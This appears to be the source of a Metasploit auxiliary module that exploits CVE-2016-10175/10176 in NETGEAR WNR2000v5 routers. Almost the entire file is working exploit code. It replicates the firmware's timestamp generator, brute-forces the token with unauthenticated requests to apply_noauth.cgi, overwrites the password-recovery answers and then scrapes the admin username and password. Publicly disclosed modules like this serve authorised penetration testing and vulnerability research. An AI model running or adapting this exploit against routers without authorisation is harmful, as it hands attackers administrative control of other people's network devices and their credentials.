##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'time'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::CRand

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'NETGEAR WNR2000v5 Administrator Password Recovery',
      'Description' => %q{
        The NETGEAR WNR2000 router has a vulnerability in the way it handles password recovery.
        This vulnerability can be exploited by an unauthenticated attacker who is able to guess
        the value of a certain timestamp which is in the configuration of the router.
        Brute forcing the timestamp token might take a few minutes, a few hours, or days, but
        it is guaranteed that it can be bruteforced.
        This module works very reliably and it has been tested with the WNR2000v5, firmware versions
        1.0.0.34 and 1.0.0.18. It should also work with the hardware revisions v4 and v3, but this
        has not been tested.
      },
      'Author' =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2016-10175'],
          ['CVE', '2016-10176'],
          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear-wnr2000.txt'],
          ['URL', 'https://seclists.org/fulldisclosure/2016/Dec/72'],
          ['URL', 'http://kb.netgear.com/000036549/Insecure-Remote-Access-and-Command-Execution-Security-Vulnerability']
        ],
      'DisclosureDate'  => 'Dec 20 2016'))
    register_options(
      [
        Opt::RPORT(80)
      ])
    register_advanced_options(
      [
        OptInt.new('TIME_OFFSET', [true, 'Maximum time differential to try', 5000]),
        OptInt.new('TIME_SURPLUS', [true, 'Increase this if you are sure the device is vulnerable and you are not getting through', 200])
      ])
  end

  def get_current_time
    res = send_request_cgi({
      'uri'     => '/',
      'method'  => 'GET'
    })
    if res && res['Date']
      date = res['Date']
      return Time.parse(date).strftime('%s').to_i
    end
  end

  # Do some crazyness to force Ruby to cast to a single-precision float and
  # back to an integer.
  # This emulates the behaviour of the soft-fp library and the float cast
  # which is done at the end of Netgear's timestamp generator.
  def ieee754_round (number)
    [number].pack('f').unpack('f*')[0].to_i
  end


  # This is the actual algorithm used in the get_timestamp function in
  # the Netgear firmware.
  def get_timestamp(time)
    srandom_r time
    t0 = random_r
    t1 = 0x17dc65df;
    hi = (t0 * t1) >> 32;
    t2 = t0 >> 31;
    t3 = hi >> 23;
    t3 = t3 - t2;
    t4 = t3 * 0x55d4a80;
    t0 = t0 - t4;
    t0 = t0 + 0x989680;

    ieee754_round(t0)
  end

  def get_creds
    res = send_request_cgi({
      'uri'     => '/BRS_netgear_success.html',
      'method'  => 'GET'
    })
    if res && res.body =~ /var sn="([\w]*)";/
      serial = $1
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to obtain serial number, bailing out...")
    end

    # 1: send serial number
    send_request_cgi({
      'uri'     => '/apply_noauth.cgi',
      'query'   => '/unauth.cgi',
      'method'  => 'POST',
      'Content-Type' => 'application/x-www-form-urlencoded',
      'vars_post' =>
      {
        'submit_flag' => 'match_sn',
        'serial_num'  => serial,
        'continue'    => '+Continue+'
      }
    })

    # 2: send answer to secret questions
    send_request_cgi({
      'uri'     => '/apply_noauth.cgi',
      'query'   => '/securityquestions.cgi',
      'method'  => 'POST',
      'Content-Type' => 'application/x-www-form-urlencoded',
      'vars_post' =>
      {
        'submit_flag' => 'security_question',
        'answer1'     => @q1,
        'answer2'     => @q2,
        'continue'    => '+Continue+'
      }
    })

    # 3: PROFIT!!!
    res = send_request_cgi({
      'uri'     => '/passwordrecovered.cgi',
      'method'  => 'GET'
    })

    if res && res.body =~ /Admin Password: (.*)<\/TD>/
      password = $1
      if password.blank?
        fail_with(Failure::Unknown, "#{peer} - Failed to obtain password! Perhaps security questions were already set?")
      end
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to obtain password")
    end

    if res && res.body =~ /Admin Username: (.*)<\/TD>/
      username = $1
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to obtain username")
    end

    return [username, password]
  end

  def send_req(timestamp)
    begin
      query_str = (timestamp == nil ? \
        '/PWD_password.htm' : \
        "/PWD_password.htm%20timestamp=#{timestamp.to_s}")
      res = send_request_raw({
          'uri'     => '/apply_noauth.cgi',
          'query'   => query_str,
          'method'  => 'POST',
          'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },
          'data'    => "submit_flag=passwd&hidden_enable_recovery=1&Apply=Apply&sysOldPasswd=&sysNewPasswd=&sysConfirmPasswd=&enable_recovery=on&question1=1&answer1=#{@q1}&question2=2&answer2=#{@q2}"
      })
      return res
    rescue ::Errno::ETIMEDOUT, ::Errno::ECONNRESET, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      return
    end
  end

  def run
    # generate the security questions
    @q1 = Rex::Text.rand_text_alpha(rand(20) + 2)
    @q2 = Rex::Text.rand_text_alpha(rand(20) + 2)

    # let's try without timestamp first (the timestamp only gets set if the user visited the page before)
    print_status("#{peer} - Trying the easy way out first")
    res = send_req(nil)
    if res && res.code == 200
      credentials = get_creds
      print_good("#{peer} - Success! Got admin username \"#{credentials[0]}\" and password \"#{credentials[1]}\"")
      return
    end

    # no result? let's just go on and bruteforce the timestamp
    print_error("#{peer} - Well that didn't work... let's do it the hard way.")

    # get the current date from the router and parse it
    end_time = get_current_time
    if end_time == nil
      fail_with(Failure::Unknown, "#{peer} - Unable to obtain current time")
    end
    if end_time <= datastore['TIME_OFFSET']
      start_time = 0
    else
      start_time = end_time - datastore['TIME_OFFSET']
    end
    end_time += datastore['TIME_SURPLUS']

    if end_time < (datastore['TIME_SURPLUS'] * 7.5).to_i
      end_time = (datastore['TIME_SURPLUS'] * 7.5).to_i
    end

    print_good("#{peer} - Got time #{end_time} from router, starting exploitation attempt.")
    print_status("#{peer} - Be patient, this might take a long time (typically a few minutes, but it might take hours).")

    # work back from the current router time minus datastore['TIME_OFFSET']
    while true
      for time in end_time.downto(start_time)
        timestamp = get_timestamp(time)
        sleep 0.1
        if time % 400 == 0
          print_status("#{peer} - Still working, trying time #{time}")
        end
        res = send_req(timestamp)
        if res && res.code == 200
          credentials = get_creds
          print_good("#{peer} - Success! Got admin username \"#{credentials[0]}\" and password \"#{credentials[1]}\"")
          store_valid_credential(user: credentials[0], private: credentials[1]) # more consistent service_name and protocol, now supplies ip and port
          return
        end
      end
      end_time = start_time
      start_time -= datastore['TIME_OFFSET']
      if start_time < 0
        if end_time <= datastore['TIME_OFFSET']
          fail_with(Failure::Unknown, "#{peer} - Exploit failed")
        end
        start_time = 0
      end
      print_status("#{peer} - Going for another round, finishing at #{start_time} and starting at #{end_time}")

      # let the router clear the buffers a bit...
      sleep 30
    end
  end
end
